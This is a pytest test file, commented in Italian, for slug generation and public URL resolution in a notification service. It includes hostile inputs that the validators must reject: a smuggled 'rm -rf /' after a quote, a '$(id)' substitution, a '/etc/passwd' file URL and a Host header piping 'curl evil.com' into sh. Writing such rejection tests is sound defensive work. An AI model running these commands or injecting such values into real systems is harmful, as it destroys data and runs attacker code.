"""Slug parlante dei receiver e risoluzione dell'URL pubblica.

Le due cose stanno insieme perche' rispondono alla stessa domanda: "a quale
indirizzo si manda questa notifica". Lo slug e' la parte per receiver, l'URL
base e' la parte per istanza, e chi le sbaglia scopre l'errore solo quando un
cron muto smette di consegnare.
"""

from types import SimpleNamespace

import pytest
from starlette.requests import Request

from app.core.urls import (
    DEFAULT_BASE_URL,
    base_url_from_request,
    configured_base_url,
    ingest_url,
    is_loopback_base_url,
    normalize_base_url,
    public_base_url,
)
from app.services.slug import (
    SLUG_PART_MAX_CHARS,
    SLUG_TOKEN_CHARS,
    build_receiver_slug,
    new_slug_token,
    slugify_part,
)


def _request(headers: dict[str, str], *, scheme: str = "http") -> Request:
    return Request(
        {
            "type": "http",
            "method": "GET",
            "scheme": scheme,
            "path": "/api/v1/receivers",
            "raw_path": b"/api/v1/receivers",
            "query_string": b"",
            "root_path": "",
            "server": ("api", 8000),
            "headers": [(k.lower().encode(), v.encode()) for k, v in headers.items()],
        }
    )


def _settings(base_url: str) -> SimpleNamespace:
    return SimpleNamespace(notifyhub_public_base_url=base_url)


# --- slug -------------------------------------------------------------------


@pytest.mark.unit
@pytest.mark.parametrize(
    ("nome", "atteso"),
    [
        ("maritime", "maritime"),
        ("elog-test", "elog-test"),
        ("Backup notturno", "backup-notturno"),
        ("Città di Genova", "citta-di-genova"),  # accenti decomposti, non buttati
        ("  spazi   multipli  ", "spazi-multipli"),
        ("UPPER_case/mixed", "upper-case-mixed"),
        ("---", ""),
        ("🚢", ""),  # nulla di traducibile: il pezzo si omette
        ("a" * 50, "a" * SLUG_PART_MAX_CHARS),
    ],
)
def test_slugify_part(nome, atteso):
    assert slugify_part(nome) == atteso


@pytest.mark.unit
def test_slugify_part_non_lascia_separatori_dopo_il_taglio():
    # 32 caratteri esatti seguiti da un separatore: il taglio non deve lasciare
    # un trattino appeso in coda.
    assert slugify_part("a" * SLUG_PART_MAX_CHARS + " coda").endswith("a")


@pytest.mark.unit
def test_build_receiver_slug_forma_parlante():
    slug = build_receiver_slug("maritime", "elog-test", token="cw2k2WWnmLalhpeyvfnCCQ")
    assert slug == "maritime-elog-test-cw2k2WWnmLalhpeyvfnCCQ"


@pytest.mark.unit
def test_build_receiver_slug_token_di_22_caratteri():
    slug = build_receiver_slug("Maritime", "eLog Test")
    assert slug.startswith("maritime-elog-test-")
    assert len(slug) == len("maritime-elog-test-") + SLUG_TOKEN_CHARS
    assert len(new_slug_token()) == SLUG_TOKEN_CHARS


@pytest.mark.unit
def test_build_receiver_slug_due_chiamate_danno_token_diversi():
    """L'entropia e' l'unica difesa dell'endpoint di ingestion: il prefisso e'
    prevedibile per costruzione, il token non deve esserlo."""
    primo = build_receiver_slug("g", "r")
    secondo = build_receiver_slug("g", "r")
    assert primo != secondo


@pytest.mark.unit
@pytest.mark.parametrize(
    ("gruppo", "receiver", "prefisso"),
    [
        ("🚢", "elog", "elog-"),
        ("maritime", "🚢", "maritime-"),
        ("🚢", "🚢", ""),  # solo il token: valido, ma non parlante
    ],
)
def test_build_receiver_slug_salta_i_pezzi_vuoti(gruppo, receiver, prefisso):
    slug = build_receiver_slug(gruppo, receiver)
    assert slug.startswith(prefisso)
    assert len(slug) == len(prefisso) + SLUG_TOKEN_CHARS


# --- URL pubblica -----------------------------------------------------------


@pytest.mark.unit
@pytest.mark.parametrize(
    ("grezzo", "atteso"),
    [
        ("https://notifyhub.com", "https://notifyhub.com"),
        ("https://notifyhub.com/", "https://notifyhub.com"),
        ("https://notifyhub.com///", "https://notifyhub.com"),
        ("  https://notifyhub.com  ", "https://notifyhub.com"),
        ("notifyhub.com", "https://notifyhub.com"),  # schema mancante: https
        ("http://localhost:5173", "http://localhost:5173"),
        ("https://notifyhub.com/hub", "https://notifyhub.com/hub"),
        ("https://notifyhub.com/hub/", "https://notifyhub.com/hub"),
        ("http://[::1]:8000", "http://[::1]:8000"),
        ("HTTPS://notifyhub.com", "https://notifyhub.com"),
    ],
)
def test_normalize_base_url_accetta(grezzo, atteso):
    assert normalize_base_url(grezzo) == atteso


@pytest.mark.unit
@pytest.mark.parametrize(
    "grezzo",
    [
        None,
        "",
        "   ",
        "ftp://notifyhub.com",
        "file:///etc/passwd",
        "https://utente:password@notifyhub.com",  # credenziali: mai in un link
        "https://notifyhub.com?a=1",
        "https://notifyhub.com#frammento",
        'https://notifyhub.com"; rm -rf /',  # tentativo di uscire dalle virgolette
        "https://notifyhub.com$(id)",
        "https://notifyhub.com}",
        "https://notifyhub.com\nX",
        "https://notify hub.com",
        "https://notifyhub.com:99999999",
        "https://",
    ],
)
def test_normalize_base_url_rifiuta(grezzo):
    assert normalize_base_url(grezzo) is None


@pytest.mark.unit
@pytest.mark.parametrize(
    ("url", "loopback"),
    [
        ("http://localhost", True),
        ("http://localhost:5173", True),
        ("http://127.0.0.1:8000", True),
        ("http://[::1]:8000", True),
        ("https://notifyhub.com", False),
    ],
)
def test_is_loopback_base_url(url, loopback):
    assert is_loopback_base_url(url) is loopback


@pytest.mark.unit
def test_base_url_from_request_dietro_reverse_proxy():
    """Lo scenario vero: nginx termina il TLS e parla http all'API. Senza
    guardare X-Forwarded-Proto il link uscirebbe in http."""
    request = _request(
        {"host": "notifyhub.com", "x-forwarded-proto": "https"},
        scheme="http",
    )
    assert base_url_from_request(request) == "https://notifyhub.com"


@pytest.mark.unit
def test_base_url_from_request_usa_x_forwarded_host_e_prefix():
    request = _request(
        {
            "host": "api-interna:8000",
            "x-forwarded-proto": "https, http",  # catena: conta il primo
            "x-forwarded-host": "notifyhub.com, api-interna",
            "x-forwarded-prefix": "hub",  # senza slash iniziale
        }
    )
    assert base_url_from_request(request) == "https://notifyhub.com/hub"


@pytest.mark.unit
def test_base_url_from_request_host_ostile_scartato():
    request = _request({"host": 'evil.com"; curl evil.com|sh #'})
    assert base_url_from_request(request) is None


@pytest.mark.unit
def test_public_base_url_preferisce_la_configurazione(monkeypatch):
    monkeypatch.setattr("app.core.urls.get_settings", lambda: _settings("https://notifyhub.com/"))
    request = _request({"host": "altro.example", "x-forwarded-proto": "https"})
    assert public_base_url(request) == "https://notifyhub.com"
    assert public_base_url() == "https://notifyhub.com"


@pytest.mark.unit
def test_public_base_url_se_configurazione_loopback_usa_la_richiesta(monkeypatch):
    """Il caso in cui si sbaglia davvero: `.env` mai toccato dopo il deploy
    dietro proxy. Meglio l'origine da cui si sta parlando che localhost."""
    monkeypatch.setattr("app.core.urls.get_settings", lambda: _settings("http://localhost:5173"))
    request = _request({"host": "notifyhub.com", "x-forwarded-proto": "https"})
    assert public_base_url(request) == "https://notifyhub.com"


@pytest.mark.unit
def test_public_base_url_senza_richiesta_ricade_sulla_configurazione(monkeypatch):
    monkeypatch.setattr("app.core.urls.get_settings", lambda: _settings("http://localhost:5173"))
    assert public_base_url() == "http://localhost:5173"
    assert configured_base_url() == "http://localhost:5173"


@pytest.mark.unit
def test_public_base_url_configurazione_inutilizzabile(monkeypatch):
    monkeypatch.setattr("app.core.urls.get_settings", lambda: _settings("non-un-url://"))
    assert public_base_url() == DEFAULT_BASE_URL
    assert configured_base_url() == DEFAULT_BASE_URL


@pytest.mark.unit
def test_ingest_url_una_sola_barra(monkeypatch):
    monkeypatch.setattr("app.core.urls.get_settings", lambda: _settings("https://notifyhub.com/"))
    assert (
        ingest_url("maritime-elog-test-abc")
        == "https://notifyhub.com/ingest/maritime-elog-test-abc"
    )
